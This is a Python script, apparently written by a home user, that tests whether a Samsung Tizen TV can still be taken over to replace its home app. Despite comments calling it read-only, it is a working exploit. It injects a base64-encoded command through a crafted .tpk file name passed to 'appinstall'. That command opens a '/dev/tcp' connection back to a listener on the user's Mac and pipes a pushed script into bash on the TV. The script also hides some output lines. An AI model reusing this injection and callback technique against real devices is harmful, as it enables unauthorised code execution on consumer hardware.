#!/usr/bin/env python3
# NUR LESEN: prueft, ob der Fernseher den Home-Umbau-Weg offen laesst.
# Veraendert am TV NICHTS (nur id/uname/Firmware/vconftool get/ls).
import base64, secrets, socket, subprocess, sys, threading, time

TV = "192.168.1.75"
NAS_SSH = ["/usr/bin/ssh", "-o", "ConnectTimeout=5", "-o", "BatchMode=yes",
           "-p", "2222", "benutzer@192.168.1.23"]

# lokale IP Richtung TV bestimmen
u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
u.connect((TV, 9)); MACIP = u.getsockname()[0]; u.close()
print("Mac-IP Richtung TV:", MACIP)

# Listener fuer die Rueckmeldung
srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind((MACIP, 0)); srv.listen(1); srv.settimeout(25)
PORT = srv.getsockname()[1]
out = {"data": b""}
def catcher():
    try:
        c, peer = srv.accept()
        c.settimeout(10)
        while True:
            d = c.recv(65536)
            if not d: break
            out["data"] += d
        c.close()
    except Exception as e:
        out["err"] = str(e)
t = threading.Thread(target=catcher, daemon=True); t.start()

tok = secrets.token_hex(4)
base = "/home/owner/share/tmp/sdk_tools"
ri = base + "/cfi-" + tok + ".sh"

inspect = r"""set +e
printf 'CLEANFRAME_CHECK_BEGIN\n'
echo "UID: $(id 2>&1)"
echo "ARCH: $(uname -m 2>&1)"
echo "--- Firmware"
sed -n '/^Version=/p;/^Model=/p' /etc/prd_info.ini 2>&1
echo "--- dotnet"
ls -d /usr/share/dotnet/shared/Microsoft.NETCore.App/* 2>&1
echo "--- CleanFrame installiert?"
ls -d /opt/usr/apps/nClrkHome1 2>&1
echo "--- Home/Startup-Werte (nur lesen)"
for k in db/appfw/home_appid db/appfw/startup_appid db/appfw/booting_appid_backup db/first_screen/type db/menu/smart_hub/ontvsetting/auto_start; do echo "$k = $(vconftool get "$k" 2>&1)"; done
printf 'CLEANFRAME_CHECK_END\n'
"""

boot = "exec 3<>/dev/tcp/%s/%d;cat %s|bash >&3 2>&3;exec 3>&-" % (MACIP, PORT, ri)
b64 = base64.b64encode(boot.encode()).decode()
name = "new2.tpk`printf${IFS}%s${IFS}" + b64 + "|base64${IFS}-d|bash`.tpk"

inner = """set -e
docker rm -f cf-tv >/dev/null 2>&1 || true
docker run -d --name cf-tv --entrypoint sleep ghcr.io/brightcraft/moonlight-tizen:master infinity >/dev/null
sleep 2
cat > /tmp/cfi.sh <<'INSPECT'
%s
INSPECT
cat > /tmp/cfrun.sh <<'RUN'
sdb connect %s:26101 >/dev/null 2>&1
sleep 2
sdb -s %s:26101 push /tmp/cfi.sh %s >/dev/null 2>&1
sdb -s %s:26101 shell '0 appinstall tpk %s' 2>&1 | head -3
RUN
docker cp /tmp/cfi.sh cf-tv:/tmp/cfi.sh >/dev/null
docker cp /tmp/cfrun.sh cf-tv:/tmp/cfrun.sh >/dev/null
echo "[appinstall-Antwort des TV]:"
docker exec cf-tv bash /tmp/cfrun.sh
sleep 2
docker rm -f cf-tv >/dev/null 2>&1 || true
""" % (inspect, TV, TV, ri, TV, name)

print("Starte Lese-Check (nur lesen)...")
p = subprocess.run(NAS_SSH + ["bash -s"], input=inner, text=True,
                   capture_output=True, timeout=120)
for line in (p.stdout + p.stderr).splitlines():
    low = line.lower()
    if "quantum" in low or "pq.html" in low or "upgraded" in low or "store now" in low:
        continue
    print(" ", line)

t.join(timeout=20)
print("\n===== RUECKMELDUNG VOM FERNSEHER =====")
txt = out["data"].decode(errors="replace")
if "CLEANFRAME_CHECK_BEGIN" in txt:
    print(txt)
    print(">>> ERGEBNIS: Weg ist OFFEN. Firmware und Werte oben.")
else:
    if txt.strip():
        print(txt)
    print(">>> ERGEBNIS: keine Rueckmeldung vom TV -> Weg ist bei dieser Firmware ZU")
    print("    (oder der Mac hat die eingehende Verbindung geblockt).")
